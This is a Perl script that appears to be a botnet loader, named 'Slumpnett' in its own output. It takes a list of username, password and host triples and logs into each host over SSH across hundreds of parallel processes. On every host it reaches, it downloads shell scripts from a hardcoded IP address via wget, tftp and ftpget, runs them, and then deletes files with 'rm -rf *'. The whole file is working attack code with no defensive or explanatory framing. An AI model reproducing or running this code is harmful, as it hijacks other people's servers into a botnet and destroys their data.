#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.248.45.131/Swizzle.sh; chmod 777 Swizzle.sh; sh Swizzle.sh; tftp 104.248.45.131 -c get Swizzle1.sh; chmod 777 Swizzle1.sh; sh Swizzle1.sh; tftp -r Swizzle2.sh -g 104.248.45.131; chmod 777 Swizzle2.sh; sh Swizzle2.sh; ftpget -v -u anonymous -p anonymous -P 21 104.248.45.131 ftp1.sh ftp1.sh; sh ftp1.sh Swizzle1.sh Swizzle2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[35;1mLoading [\x1b[1;32mS L U M P\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
                } else {
                        print "\e[34;1mScanning \x1b[1;35mSSH\n";
                }
        } else {
                print "\e[36;1mLoading [\x1b[1;32mGOOFY\x1b[1;37m] JOINED Slumpnett\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

